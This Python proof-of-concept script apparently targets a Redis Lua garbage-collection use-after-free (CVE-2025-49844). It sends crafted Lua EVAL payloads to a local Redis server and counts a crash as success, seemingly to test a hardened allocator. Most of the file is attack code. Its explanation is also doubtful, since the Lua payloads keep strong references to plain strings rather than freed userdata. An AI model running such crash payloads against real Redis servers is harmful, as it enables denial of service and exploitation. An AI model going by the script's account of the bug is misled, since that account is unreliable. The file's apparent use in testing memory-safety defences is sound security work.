#!/usr/bin/env python3
"""
CVE-2025-49844: Redis Lua GC use-after-free trigger.

This script connects to a local Redis instance and sends crafted Lua
scripts designed to trigger the use-after-free in Redis's embedded Lua
interpreter.  The vulnerability occurs when Lua garbage collection frees
userdata objects that are still referenced on the Lua evaluation stack.

Attack vector:
  1. Create Lua userdata objects (via redis.call results holding cdata)
  2. Force an aggressive GC cycle while references exist on the stack
  3. Access the freed userdata, triggering use-after-free

With stock glibc:  The freed memory may be reallocated and the stale
  pointer dereferences corrupted data -> SIGSEGV or RCE.

With glibc_rust TSM:  The generational arena detects the generation
  mismatch on the stale pointer, quarantines the access, and the
  healing engine returns a safe default instead of allowing the UAF.
"""

import socket
import sys
import time

REDIS_HOST = "127.0.0.1"
REDIS_PORT = 6379
TIMEOUT = 10


def redis_command(sock: socket.socket, *args: str) -> bytes:
    """Send a RESP command and read the response."""
    # Build RESP array
    parts = [f"*{len(args)}\r\n"]
    for arg in args:
        encoded = str(arg)
        parts.append(f"${len(encoded)}\r\n{encoded}\r\n")
    sock.sendall("".join(parts).encode())

    # Read response (simplified: read until we have a complete response)
    response = b""
    sock.settimeout(TIMEOUT)
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
            # Simple heuristic: RESP responses end with \r\n
            if response.endswith(b"\r\n"):
                break
    except socket.timeout:
        pass
    return response


def trigger_lua_gc_uaf(sock: socket.socket) -> bool:
    """
    Send the crafted Lua script that triggers the GC use-after-free.

    The script creates a chain of Lua tables and userdata objects,
    forces garbage collection at a critical point, then accesses
    the potentially-freed objects.
    """
    # Phase 1: Populate Redis with keys that will become Lua userdata
    print("[trigger] Phase 1: Seeding Redis keys for Lua userdata creation...")
    for i in range(64):
        redis_command(sock, "SET", f"uaf_key_{i}", f"{'A' * 512}")

    # Phase 2: Send crafted Lua script
    # This Lua script creates userdata via redis.call(), forces GC,
    # then accesses the freed userdata pointers.
    lua_payload = r"""
    -- Phase A: Create many Lua objects that hold Redis userdata references
    local refs = {}
    for i = 1, 64 do
        local val = redis.call('GET', 'uaf_key_' .. i)
        -- Store in table to keep reference on Lua stack
        refs[i] = val
        -- Also create nested tables to fragment the Lua heap
        refs['tbl_' .. i] = {val, val, string.rep('B', 256)}
    end

    -- Phase B: Create secondary references and break primary ones
    local secondary = {}
    for i = 1, 64 do
        secondary[i] = refs[i]
        refs[i] = nil  -- Drop primary reference
    end

    -- Phase C: Force aggressive garbage collection
    -- This is the critical window: GC may free the userdata
    -- while secondary references exist in an inconsistent state
    collectgarbage('collect')
    collectgarbage('collect')
    collectgarbage('collect')

    -- Phase D: Create memory pressure to reclaim freed pages
    local pressure = {}
    for i = 1, 256 do
        pressure[i] = string.rep('C', 1024)
    end

    -- Phase E: Access the potentially-freed userdata
    -- With stock glibc, this may dereference freed/reallocated memory
    local result = {}
    for i = 1, 64 do
        if secondary[i] then
            -- This access triggers the UAF if GC freed the userdata
            local len = #secondary[i]
            result[i] = len
        end
    end

    -- Phase F: Second GC + access cycle to increase trigger probability
    collectgarbage('collect')
    for i = 1, 256 do
        pressure[i] = nil
    end
    collectgarbage('collect')

    -- Re-access after second GC cycle
    for i = 1, 64 do
        if secondary[i] then
            local s = tostring(secondary[i])
            result[64 + i] = s
        end
    end

    return redis.status_reply('trigger_complete')
    """

    print("[trigger] Phase 2: Sending crafted Lua script (UAF trigger)...")
    response = redis_command(sock, "EVAL", lua_payload, "0")
    print(f"[trigger] EVAL response: {response[:200]}")

    # Phase 3: Repeat with variations to increase trigger probability
    print("[trigger] Phase 3: Repeating with concurrency pressure...")

    lua_aggressive = r"""
    -- More aggressive variant: interleave alloc/free/access
    local function make_chain(depth)
        if depth <= 0 then return redis.call('GET', 'uaf_key_1') end
        local t = {make_chain(depth - 1)}
        collectgarbage('step', 10)
        return t
    end

    local chains = {}
    for i = 1, 32 do
        chains[i] = make_chain(8)
    end

    -- Destroy half the chains and GC
    for i = 1, 16 do
        chains[i] = nil
    end
    collectgarbage('collect')

    -- Access surviving chains (may reference freed sub-objects)
    local ok = 0
    for i = 17, 32 do
        if type(chains[i]) == 'table' then
            ok = ok + 1
        end
    end

    return redis.status_reply('aggressive_complete_' .. ok)
    """

    for attempt in range(3):
        print(f"[trigger]   Attempt {attempt + 1}/3...")
        try:
            response = redis_command(sock, "EVAL", lua_aggressive, "0")
            print(f"[trigger]   Response: {response[:200]}")
        except (BrokenPipeError, ConnectionResetError) as e:
            print(f"[trigger]   Connection lost (server likely crashed): {e}")
            return True  # Crash detected

    return False


def main():
    print(f"[trigger] Connecting to Redis at {REDIS_HOST}:{REDIS_PORT}...")

    # Retry connection a few times
    sock = None
    for attempt in range(5):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            sock.connect((REDIS_HOST, REDIS_PORT))
            break
        except ConnectionRefusedError:
            print(f"[trigger] Connection refused, retry {attempt + 1}/5...")
            if sock:
                sock.close()
            sock = None
            time.sleep(1)

    if sock is None:
        print("[trigger] ERROR: Could not connect to Redis")
        sys.exit(1)

    # Verify connection
    response = redis_command(sock, "PING")
    if b"PONG" not in response:
        print(f"[trigger] ERROR: Unexpected PING response: {response}")
        sys.exit(1)
    print("[trigger] Connected successfully")

    try:
        crashed = trigger_lua_gc_uaf(sock)
    except Exception as e:
        print(f"[trigger] Exception during trigger: {e}")
        crashed = True
    finally:
        try:
            sock.close()
        except Exception:
            pass

    if crashed:
        print("[trigger] Server appears to have crashed (UAF triggered)")
        sys.exit(2)
    else:
        print("[trigger] Server survived (UAF may have been healed or not triggered)")
        sys.exit(0)


if __name__ == "__main__":
    main()
